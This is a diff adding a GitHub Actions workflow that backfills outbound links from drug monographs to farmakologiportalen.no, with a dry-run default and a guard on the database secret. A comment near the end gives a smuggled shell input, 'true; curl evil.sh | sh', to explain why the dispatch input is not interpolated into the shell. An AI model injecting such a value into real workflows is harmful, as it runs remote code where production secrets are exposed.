@@ -1,0 +1,80 @@
+name: farmakologiportalen-links
+
+# Fills `drugs.farmakologiportalen_path` — the outbound link every drug
+# monograph shows to its counterpart on https://farmakologiportalen.no.
+#
+# Migration 0101 adds the column initialized to NULL for every existing row, so
+# a plain production rollout ships the feature switched off: the code renders a
+# link only where a path is stored, and nothing in `vercel build` stores one.
+# This job is the rollout step, and it exists so that step does not depend on an
+# operator having a production DATABASE_URL on their laptop and finding the
+# README command. Run it once after the deploy that carries 0101, then again
+# whenever the links should be refreshed (see docs/ops/farmakologiportalen-links.md).
+#
+# Deliberately NOT wired into deploy-production.yml: the backfill reads a
+# third-party site, and a release that fails because farmakologiportalen.no is
+# briefly down would be a worse outcome than a link filled a few minutes later.
+# Nothing else in the deploy needs the network at that point.
+#
+# Dispatch-only, no `schedule:`. The portal does add substances over time, so a
+# weekly run is a reasonable thing to want — but that would make this the only
+# unattended writer to the production catalog added by this change, and turning
+# it on should be a deliberate choice. Adding a `schedule:` block here is the
+# whole change if you want it.
+on:
+  workflow_dispatch:
+    inputs:
+      dry_run:
+        description: 'Report the matches without writing (true/false)'
+        required: false
+        default: 'true'
+
+# Never let two runs write the column at once.
+concurrency:
+  group: farmakologiportalen-links
+  cancel-in-progress: false
+
+jobs:
+  backfill:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: main
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+          cache: 'npm'
+      - name: Install deps
+        run: npm ci
+
+      # Same guard as catalog-drift.yml: without the secret there is nothing to
+      # write to, and a notice reads better than a red job on a fork.
+      - name: Check DATABASE_URL is configured
+        id: guard
+        env:
+          DATABASE_URL: ${{ secrets.DATABASE_URL }}
+        run: |
+          if [ -z "$DATABASE_URL" ]; then
+            echo "::notice::DATABASE_URL secret is not set — skipping the Farmakologiportalen link backfill."
+            echo "configured=false" >> "$GITHUB_OUTPUT"
+          else
+            echo "configured=true" >> "$GITHUB_OUTPUT"
+          fi
+
+      # The dispatch input goes through the environment and is compared, never
+      # interpolated into the shell: a `${{ }}` expression is substituted before
+      # the shell sees it, so an input of `true; curl evil.sh | sh` would run as
+      # shell in a step holding the production DATABASE_URL. Defaulting to a dry
+      # run also means a mis-typed input previews rather than writes.
+      - name: Backfill monograph links
+        if: steps.guard.outputs.configured == 'true'
+        env:
+          DATABASE_URL: ${{ secrets.DATABASE_URL }}
+          DRY_RUN: ${{ github.event.inputs.dry_run || 'true' }}
+        run: |
+          if [ "$DRY_RUN" = "false" ]; then
+            npx tsx scripts/backfill-farmakologiportalen-links.ts
+          else
+            npx tsx scripts/backfill-farmakologiportalen-links.ts --dry-run
+          fi
